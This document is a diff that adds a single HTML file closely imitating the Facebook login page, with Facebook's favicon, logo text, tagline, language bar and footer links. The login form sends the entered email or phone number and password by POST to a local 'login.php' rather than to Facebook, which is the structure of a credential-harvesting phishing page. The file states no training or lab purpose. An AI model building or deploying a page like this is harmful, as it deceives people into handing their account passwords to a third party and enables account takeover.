@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook – log in or sign up</title>
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Roboto', Helvetica, Arial, sans-serif;
+            background-color: #f2f4f7;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ===== MAIN LAYOUT ===== */
+        .main-wrapper {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px 80px;
+            gap: 80px;
+            max-width: 1100px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        /* ===== LEFT SIDE ===== */
+        .left-side {
+            max-width: 500px;
+            padding-top: 40px;
+        }
+
+        .fb-logo-text {
+            color: #1877f2;
+            font-size: 56px;
+            font-weight: 700;
+            line-height: 1;
+            margin-bottom: 16px;
+            letter-spacing: -2px;
+            font-family: 'Roboto', Helvetica, Arial, sans-serif;
+        }
+
+        .fb-tagline {
+            font-size: 24px;
+            font-weight: 400;
+            line-height: 1.3;
+            color: #1c1e21;
+        }
+
+        /* ===== RIGHT SIDE (LOGIN CARD) ===== */
+        .login-card {
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1);
+            padding: 20px;
+            width: 396px;
+            text-align: center;
+        }
+
+        .login-form {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 17px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            color: #1d2129;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .form-input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        .form-input::placeholder {
+            color: #96999e;
+        }
+
+        .btn-login {
+            width: 100%;
+            background-color: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            padding: 14px 16px;
+            font-size: 20px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            line-height: 1.2;
+        }
+
+        .btn-login:hover {
+            background-color: #166fe5;
+        }
+
+        .btn-login:active {
+            background-color: #1464d0;
+        }
+
+        .forgot-link {
+            display: inline-block;
+            margin-top: 16px;
+            margin-bottom: 20px;
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            border-top: 1px solid #dadde1;
+            margin: 0 0 20px;
+        }
+
+        .btn-create {
+            display: inline-block;
+            background-color: #42b72a;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            padding: 14px 24px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            text-decoration: none;
+        }
+
+        .btn-create:hover {
+            background-color: #36a420;
+        }
+
+        .create-page-text {
+            margin-top: 28px;
+            font-size: 14px;
+            color: #1c1e21;
+        }
+
+        .create-page-text a {
+            color: #1c1e21;
+            font-weight: 700;
+            text-decoration: none;
+        }
+
+        .create-page-text a:hover {
+            text-decoration: underline;
+        }
+
+        /* ===== FOOTER ===== */
+        .site-footer {
+            background: #fff;
+            border-top: 1px solid #e5e5e5;
+            padding: 20px 20px 30px;
+        }
+
+        .footer-inner {
+            max-width: 980px;
+            margin: 0 auto;
+        }
+
+        .footer-lang {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 4px 8px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid #e5e5e5;
+            margin-bottom: 8px;
+            align-items: center;
+        }
+
+        .footer-lang span {
+            color: #737373;
+            font-size: 12px;
+        }
+
+        .footer-lang a {
+            color: #385898;
+            font-size: 12px;
+            text-decoration: none;
+        }
+
+        .footer-lang a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-lang button {
+            background: #f5f6f7;
+            border: 1px solid #ccd0d5;
+            border-radius: 2px;
+            color: #4b4f56;
+            font-size: 12px;
+            padding: 1px 8px;
+            cursor: pointer;
+            font-weight: 700;
+            line-height: 20px;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 4px 12px;
+        }
+
+        .footer-links a {
+            color: #737373;
+            font-size: 12px;
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-meta {
+            margin-top: 12px;
+            font-size: 11px;
+            color: #737373;
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 900px) {
+            .main-wrapper {
+                flex-direction: column;
+                gap: 24px;
+                padding: 20px 16px 40px;
+                align-items: center;
+                text-align: center;
+            }
+            .left-side {
+                padding-top: 0;
+            }
+            .fb-logo-text {
+                font-size: 40px;
+            }
+            .fb-tagline {
+                font-size: 18px;
+            }
+            .login-card {
+                width: 100%;
+                max-width: 396px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="main-wrapper">
+    <!-- Left Side -->
+    <div class="left-side">
+        <div class="fb-logo-text">facebook</div>
+        <p class="fb-tagline">Facebook helps you connect and share with the people in your life.</p>
+    </div>
+
+    <!-- Right Side -->
+    <div class="login-card">
+        <form class="login-form" action="login.php" method="POST" autocomplete="off">
+            <input type="text" name="username" class="form-input" placeholder="Email address or phone number" required>
+            <input type="password" name="password" class="form-input" placeholder="Password" required>
+            <button type="submit" class="btn-login">Log in</button>
+        </form>
+        <a class="forgot-link" href="#">Forgotten password?</a>
+        <div class="divider"></div>
+        <button class="btn-create" type="button">Create new account</button>
+        <div class="create-page-text">
+            <a href="#">Create a Page</a> for a celebrity, brand or business.
+        </div>
+    </div>
+</div>
+
+<!-- Footer -->
+<footer class="site-footer">
+    <div class="footer-inner">
+        <div class="footer-lang">
+            <span>English (UK)</span>
+            <a href="#">Français (France)</a>
+            <a href="#">العربية</a>
+            <a href="#">বাংলা</a>
+            <a href="#">हिन्दी</a>
+            <a href="#">Español</a>
+            <a href="#">Português (Brasil)</a>
+            <a href="#">Italiano</a>
+            <a href="#">Deutsch</a>
+            <a href="#">日本語</a>
+            <a href="#">한국어</a>
+            <button>+</button>
+        </div>
+        <div class="footer-links">
+            <a href="#">Sign Up</a>
+            <a href="#">Log in</a>
+            <a href="#">Messenger</a>
+            <a href="#">Facebook Lite</a>
+            <a href="#">Video</a>
+            <a href="#">Places</a>
+            <a href="#">Games</a>
+            <a href="#">Marketplace</a>
+            <a href="#">Meta Pay</a>
+            <a href="#">Meta Store</a>
+            <a href="#">Meta Quest</a>
+            <a href="#">Ray-Ban Meta</a>
+            <a href="#">Meta AI</a>
+            <a href="#">Instagram</a>
+            <a href="#">Threads</a>
+            <a href="#">Fundraisers</a>
+            <a href="#">Services</a>
+            <a href="#">Voting Information Centre</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">Privacy Centre</a>
+            <a href="#">Groups</a>
+            <a href="#">About</a>
+            <a href="#">Create ad</a>
+            <a href="#">Create Page</a>
+            <a href="#">Developers</a>
+            <a href="#">Careers</a>
+            <a href="#">Cookies</a>
+            <a href="#">AdChoices</a>
+            <a href="#">Terms</a>
+            <a href="#">Help</a>
+            <a href="#">Contact uploading and non-users</a>
+            <a href="#">Settings</a>
+            <a href="#">Activity log</a>
+        </div>
+        <div class="footer-meta">Meta © 2026</div>
+    </div>
+</footer>
+
+</body>
+</html>
